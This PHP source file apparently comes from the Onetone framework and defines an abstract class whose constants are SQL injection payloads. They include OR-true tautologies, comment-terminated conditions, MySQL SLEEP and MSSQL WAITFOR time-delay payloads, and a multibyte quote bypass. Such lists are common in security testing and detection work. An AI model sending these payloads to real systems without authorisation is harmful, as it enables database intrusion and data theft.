<?php

declare(strict_types=1);

/**
 * License - Onetone Framework
 *
 * @copyright  Copyright (C) Onetoneframework (tactics6655@gmail.com)
 * @license    AGPL 3.0
 */

namespace Clover\Enumeration;

abstract class InjectionPayload
{
    public const BASIC_OR_TRUE_CONDITION = "' OR '1";
    public const OR_TRUE_WITH_COMMENT = " ' OR 1 -- -";
    public const EMPTY_STRING_COMPARISON = " OR \"\" = ";
    public const ESCAPED_OR_TRUE_WITH_COMMENT = "\" OR 1 = 1 -- -";
    public const TIME_DELAY_SLEEP = ",(select * from (select(sleep(5)))a)";
    public const URL_ENCODED_TIME_DELAY = "%2c(select%20*%20from%20(select(sleep(5)))a)";
    public const MSSQL_WAITFOR_DELAY = "';WAITFOR DELAY '0:0:05'--";
    public const AND_DELAY_WITH_STRING_COMPARISON = "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='";
    public const AND_DELAY_SIMPLE = "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)";
    public const AND_DELAY_WITH_COMMENT = "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--";
    public const ALWAYS_FALSE_CONDITION = "AS INJECTX WHERE 1=1 AND 1=0--";
    public const ALWAYS_TRUE_CONDITION = "WHERE 1=1 AND 1=1";
    public const MULTIBYTE_ENCODING = "%bf%27";
}